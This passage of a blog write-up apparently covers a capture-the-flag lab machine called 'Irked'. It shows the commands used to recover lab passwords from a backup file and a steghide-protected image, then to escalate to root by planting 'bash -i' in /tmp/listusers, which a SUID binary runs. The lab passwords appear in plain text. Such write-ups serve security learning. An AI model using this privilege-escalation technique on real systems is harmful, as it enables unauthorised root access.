+</span></span><span style="display:flex;"><span>total <span style="color:#a5d6ff">8</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#a5d6ff">2</span> djmardov djmardov <span style="color:#a5d6ff">4096</span> May <span style="color:#a5d6ff">11</span> <span style="color:#a5d6ff">2018</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#a5d6ff">18</span> djmardov djmardov <span style="color:#a5d6ff">4096</span> Nov <span style="color:#a5d6ff">3</span> <span style="color:#a5d6ff">2018</span> ..
+</span></span><span style="display:flex;"><span>ircd@irked:/home/djmardov/Desktop$ cd ..
+</span></span><span style="display:flex;"><span>ircd@irked:/home/djmardov$ ls Documents/
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>ircd@irked:/home/djmardov$ cd Documents/
+</span></span><span style="display:flex;"><span>ircd@irked:/home/djmardov/Documents$ cat user.txt
+</span></span><span style="display:flex;"><span>cat: user.txt: Permission denied
+</span></span><span style="display:flex;"><span>ircd@irked:/home/djmardov/Documents$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#a5d6ff">16</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#a5d6ff">2</span> djmardov djmardov <span style="color:#a5d6ff">4096</span> May <span style="color:#a5d6ff">15</span> <span style="color:#a5d6ff">2018</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#a5d6ff">18</span> djmardov djmardov <span style="color:#a5d6ff">4096</span> Nov <span style="color:#a5d6ff">3</span> <span style="color:#a5d6ff">2018</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#a5d6ff">1</span> djmardov djmardov <span style="color:#a5d6ff">52</span> May <span style="color:#a5d6ff">16</span> <span style="color:#a5d6ff">2018</span> .backup
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#a5d6ff">1</span> djmardov djmardov <span style="color:#a5d6ff">33</span> May <span style="color:#a5d6ff">15</span> <span style="color:#a5d6ff">2018</span> user.txt
+</span></span><span style="display:flex;"><span>ircd@irked:/home/djmardov/Documents$ cat .backup
+</span></span><span style="display:flex;"><span>Super elite steg backup pw
+</span></span><span style="display:flex;"><span>UPupDOWNdownLRlrBAbaSSss    
+</span></span><span style="display:flex;"><span>ircd@irked:/home/djmardov/Documents$
+</span></span></code></pre></div><p>It took me quite a while to figure out what I was supposed to do with this information. I knew it related to steganography, but I had no experience with it and didn&rsquo;t know where to begin. I eventually came across a tool called steghide, which is used to derive password-protected messages from images. I remembered that there was an image on the main page of the web server, so I attempted to use the tool against it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/htb/irked$ steghide info irked.jpg
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;irked.jpg&#34;</span>:
+</span></span><span style="display:flex;"><span>    format: jpeg
+</span></span><span style="display:flex;"><span>    capacity: 1.5 KB
+</span></span><span style="display:flex;"><span>Try to get information about embedded data ? <span style="color:#ff7b72;font-weight:bold">(</span>y/n<span style="color:#ff7b72;font-weight:bold">)</span> y
+</span></span><span style="display:flex;"><span>Enter passphrase:
+</span></span><span style="display:flex;"><span>    embedded file <span style="color:#a5d6ff">&#34;pass.txt&#34;</span>:
+</span></span><span style="display:flex;"><span>    size: 17.0 Byte
+</span></span><span style="display:flex;"><span>    encrypted: rijndael-128, cbc
+</span></span><span style="display:flex;"><span>    compressed: yes
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/irked$ steghide extract -sf irked.jpg
+</span></span><span style="display:flex;"><span>Enter passphrase:
+</span></span><span style="display:flex;"><span>wrote extracted data to <span style="color:#a5d6ff">&#34;pass.txt&#34;</span>.
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/irked$ cat pass.txt
+</span></span><span style="display:flex;"><span>Kab6h+m+bbp2J:HG
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/irked$
+</span></span></code></pre></div><p>This turned out to be the password for &lsquo;djmardov&rsquo;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~$ ssh djmardov@10.10.10.117
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#a5d6ff">&#39;10.10.10.117 (10.10.10.117)&#39;</span> can<span style="color:#a5d6ff">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">ECDSA key fingerprint is SHA256:kunqU6QEf9TV3pbsZKznVcntLklRwiVobFZiJguYs4g.
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">Warning: Permanently added &#39;</span>10.10.10.117<span style="color:#a5d6ff">&#39; (ECDSA) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">djmardov@10.10.10.117&#39;</span>s password:
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#ff7b72">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Tue May <span style="color:#a5d6ff">15</span> 08:56:32 <span style="color:#a5d6ff">2018</span> from 10.33.3.3
+</span></span><span style="display:flex;"><span>djmardov@irked:~$ id
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>1000<span style="color:#ff7b72;font-weight:bold">(</span>djmardov<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>1000<span style="color:#ff7b72;font-weight:bold">(</span>djmardov<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>1000<span style="color:#ff7b72;font-weight:bold">(</span>djmardov<span style="color:#ff7b72;font-weight:bold">)</span>,24<span style="color:#ff7b72;font-weight:bold">(</span>cdrom<span style="color:#ff7b72;font-weight:bold">)</span>,25<span style="color:#ff7b72;font-weight:bold">(</span>floppy<span style="color:#ff7b72;font-weight:bold">)</span>,29<span style="color:#ff7b72;font-weight:bold">(</span>audio<span style="color:#ff7b72;font-weight:bold">)</span>,30<span style="color:#ff7b72;font-weight:bold">(</span>dip<span style="color:#ff7b72;font-weight:bold">)</span>,44<span style="color:#ff7b72;font-weight:bold">(</span>video<span style="color:#ff7b72;font-weight:bold">)</span>,46<span style="color:#ff7b72;font-weight:bold">(</span>plugdev<span style="color:#ff7b72;font-weight:bold">)</span>,108<span style="color:#ff7b72;font-weight:bold">(</span>netdev<span style="color:#ff7b72;font-weight:bold">)</span>,110<span style="color:#ff7b72;font-weight:bold">(</span>lpadmin<span style="color:#ff7b72;font-weight:bold">)</span>,113<span style="color:#ff7b72;font-weight:bold">(</span>scanner<span style="color:#ff7b72;font-weight:bold">)</span>,117<span style="color:#ff7b72;font-weight:bold">(</span>bluetooth<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>djmardov@irked:~$
+</span></span></code></pre></div><p>Once I was able to get the user flag, I began to focus my attention on getting a root shell.</p>
+<p>My earlier enumeration using linPEAS notably didn&rsquo;t yield much, so I knew I had to look for some sort of misconfiguration. I remember that there was an unusual SUID binary &lsquo;viewuser&rsquo; in the /usr/bin/ folder. I performed some initial enumeration, which resulted in this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>djmardov@irked:/usr/bin$ viewuser
+</span></span><span style="display:flex;"><span>This application is being devleoped to set and test user permissions
+</span></span><span style="display:flex;"><span>It is still being actively developed
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">(</span>unknown<span style="color:#ff7b72;font-weight:bold">)</span> :0 2020-05-03 13:04 <span style="color:#ff7b72;font-weight:bold">(</span>:0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>djmardov pts/0 2020-05-03 13:05 <span style="color:#ff7b72;font-weight:bold">(</span>10.10.14.37<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>sh: 1: /tmp/listusers: not found
+</span></span><span style="display:flex;"><span>djmardov@irked:/usr/bin$ echo <span style="color:#a5d6ff">&#39;echo hello&#39;</span> &gt; /tmp/listusers
+</span></span><span style="display:flex;"><span>djmardov@irked:/usr/bin$ chmod +x /tmp/listusers
+</span></span><span style="display:flex;"><span>djmardov@irked:/usr/bin$ viewuser
+</span></span><span style="display:flex;"><span>This application is being devleoped to set and test user permissions
+</span></span><span style="display:flex;"><span>It is still being actively developed
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">(</span>unknown<span style="color:#ff7b72;font-weight:bold">)</span> :0 2020-05-03 13:04 <span style="color:#ff7b72;font-weight:bold">(</span>:0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>djmardov pts/0 2020-05-03 13:07 <span style="color:#ff7b72;font-weight:bold">(</span>10.10.14.37<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>hello
+</span></span><span style="display:flex;"><span>djmardov@irked:/usr/bin$ echo <span style="color:#a5d6ff">&#39;id&#39;</span> &gt; /tmp/listusers
+</span></span><span style="display:flex;"><span>djmardov@irked:/usr/bin$ chmod +x /tmp/listusers
+</span></span><span style="display:flex;"><span>djmardov@irked:/usr/bin$ viewuser
+</span></span><span style="display:flex;"><span>This application is being devleoped to set and test user permissions
+</span></span><span style="display:flex;"><span>It is still being actively developed
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">(</span>unknown<span style="color:#ff7b72;font-weight:bold">)</span> :0 2020-05-03 13:04 <span style="color:#ff7b72;font-weight:bold">(</span>:0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>djmardov pts/0 2020-05-03 13:12 <span style="color:#ff7b72;font-weight:bold">(</span>10.10.14.37<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>1000<span style="color:#ff7b72;font-weight:bold">(</span>djmardov<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>1000<span style="color:#ff7b72;font-weight:bold">(</span>djmardov<span style="color:#ff7b72;font-weight:bold">)</span>,24<span style="color:#ff7b72;font-weight:bold">(</span>cdrom<span style="color:#ff7b72;font-weight:bold">)</span>,25<span style="color:#ff7b72;font-weight:bold">(</span>floppy<span style="color:#ff7b72;font-weight:bold">)</span>,29<span style="color:#ff7b72;font-weight:bold">(</span>audio<span style="color:#ff7b72;font-weight:bold">)</span>,30<span style="color:#ff7b72;font-weight:bold">(</span>dip<span style="color:#ff7b72;font-weight:bold">)</span>,44<span style="color:#ff7b72;font-weight:bold">(</span>video<span style="color:#ff7b72;font-weight:bold">)</span>,46<span style="color:#ff7b72;font-weight:bold">(</span>plugdev<span style="color:#ff7b72;font-weight:bold">)</span>,108<span style="color:#ff7b72;font-weight:bold">(</span>netdev<span style="color:#ff7b72;font-weight:bold">)</span>,110<span style="color:#ff7b72;font-weight:bold">(</span>lpadmin<span style="color:#ff7b72;font-weight:bold">)</span>,113<span style="color:#ff7b72;font-weight:bold">(</span>scanner<span style="color:#ff7b72;font-weight:bold">)</span>,117<span style="color:#ff7b72;font-weight:bold">(</span>bluetooth<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>djmardov@irked:/usr/bin$ 
+</span></span></code></pre></div><p>So without looking at the source code, one could assume that it is running some sort of system call to &lsquo;/tmp/listusers&rsquo;. The unfortunate thing, for them anyway, is that there appears to be no input validation. Given this, simply writing <code>bash -i</code> and making it executable should grant a root shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>djmardov@irked:/usr/bin$ viewuser
+</span></span><span style="display:flex;"><span>This application is being devleoped to set and test user permissions
+</span></span><span style="display:flex;"><span>It is still being actively developed
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">(</span>unknown<span style="color:#ff7b72;font-weight:bold">)</span> :0 2020-05-03 13:04 <span style="color:#ff7b72;font-weight:bold">(</span>:0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>djmardov pts/1 2020-05-03 16:38 <span style="color:#ff7b72;font-weight:bold">(</span>10.10.14.17<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>sh: 1: /tmp/listusers: not found
+</span></span><span style="display:flex;"><span>djmardov@irked:/usr/bin$ echo <span style="color:#a5d6ff">&#39;bash -i&#39;</span> &gt; /tmp/listusers
+</span></span><span style="display:flex;"><span>djmardov@irked:/usr/bin$ viewuser
+</span></span><span style="display:flex;"><span>This application is being devleoped to set and test user permissions
+</span></span><span style="display:flex;"><span>It is still being actively developed
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">(</span>unknown<span style="color:#ff7b72;font-weight:bold">)</span> :0 2020-05-03 13:04 <span style="color:#ff7b72;font-weight:bold">(</span>:0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>djmardov pts/1 2020-05-03 16:38 <span style="color:#ff7b72;font-weight:bold">(</span>10.10.14.17<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>sh: 1: /tmp/listusers: Permission denied
+</span></span><span style="display:flex;"><span>djmardov@irked:/usr/bin$ chmod +x /tmp/listusers
+</span></span><span style="display:flex;"><span>djmardov@irked:/usr/bin$ viewuser
+</span></span><span style="display:flex;"><span>This application is being devleoped to set and test user permissions
+</span></span><span style="display:flex;"><span>It is still being actively developed
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">(</span>unknown<span style="color:#ff7b72;font-weight:bold">)</span> :0 2020-05-03 13:04 <span style="color:#ff7b72;font-weight:bold">(</span>:0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>djmardov pts/1 2020-05-03 16:38 <span style="color:#ff7b72;font-weight:bold">(</span>10.10.14.17<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>root@irked:/usr/bin# id
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>1000<span style="color:#ff7b72;font-weight:bold">(</span>djmardov<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>1000<span style="color:#ff7b72;font-weight:bold">(</span>djmardov<span style="color:#ff7b72;font-weight:bold">)</span>,24<span style="color:#ff7b72;font-weight:bold">(</span>cdrom<span style="color:#ff7b72;font-weight:bold">)</span>,25<span style="color:#ff7b72;font-weight:bold">(</span>floppy<span style="color:#ff7b72;font-weight:bold">)</span>,29<span style="color:#ff7b72;font-weight:bold">(</span>audio<span style="color:#ff7b72;font-weight:bold">)</span>,30<span style="color:#ff7b72;font-weight:bold">(</span>dip<span style="color:#ff7b72;font-weight:bold">)</span>,44<span style="color:#ff7b72;font-weight:bold">(</span>video<span style="color:#ff7b72;font-weight:bold">)</span>,46<span style="color:#ff7b72;font-weight:bold">(</span>plugdev<span style="color:#ff7b72;font-weight:bold">)</span>,108<span style="color:#ff7b72;font-weight:bold">(</span>netdev<span style="color:#ff7b72;font-weight:bold">)</span>,110<span style="color:#ff7b72;font-weight:bold">(</span>lpadmin<span style="color:#ff7b72;font-weight:bold">)</span>,113<span style="color:#ff7b72;font-weight:bold">(</span>scanner<span style="color:#ff7b72;font-weight:bold">)</span>,117<span style="color:#ff7b72;font-weight:bold">(</span>bluetooth<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>root@irked:/usr/bin# 
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2020 -
+    
+    2025
+     matt johnson 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
